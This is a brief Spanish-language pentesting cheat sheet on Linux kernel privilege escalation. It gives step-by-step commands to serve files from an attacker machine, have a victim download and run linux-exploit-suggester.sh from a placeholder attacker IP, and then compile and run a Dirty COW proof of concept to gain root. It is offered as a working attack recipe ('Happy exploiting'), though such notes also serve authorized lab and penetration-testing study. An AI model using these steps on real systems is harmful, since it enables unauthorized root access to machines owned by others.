# Kernel exploits

Se puede vulnerar y escalar privilegios explotando vulnerabilidades a nivel de kernel

## Vector de ataque

En esencia el vector de ataque es el siguiente:

1. Montar servidor web en atacante
2. Descargar linux-exploit-suggester.sh
3. Ejecutar binario
4. Descargar exploit
5. Compilar y ejecutar exploit

## Maquina atacante
### Descargar linux-exploit-suggester.sh

Si no se puede descargar en la maquina victima el ejecutable se debe descargar en la maquina atacante y montar server.

Para ello hacemos lo siguiente

```
git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git
cd linux-exploit-suggester/
```
### Montar web
Montamos un servicio web para que la maquina victima pueda descargar el archivo (haremos lo mismo para el exploit)

```
python3 -m http.server 80 #Host
```

### Descargar archivos (Victima)
Teniendo la ip del atacante descargamos el archivo de la siguiente manera

```
cd /tmp
wget xx.xx.xx.xx/linux-exploit-suggester.sh #Victim
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

Esto arrojará un listado de exploit posibles, buscamos los que estan a nivel de kernel y lo buscamos en exploit-db.com

En este caso particular veremos que hay un exploit asociado a dirtycow.

### Exploit

Siguiendo el mismo ejercicio de linux exploit suggester, descargamos algun poc de dirty cow (recomiendo este:  https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679)

suponiendo que le pusimos cowroot.c en la maquina victima compilamos

```
gcc cowroot.c -o cowroot -pthread
./cowroot
```
Con eso escalamos a root.

---
Happy exploiting - Zpx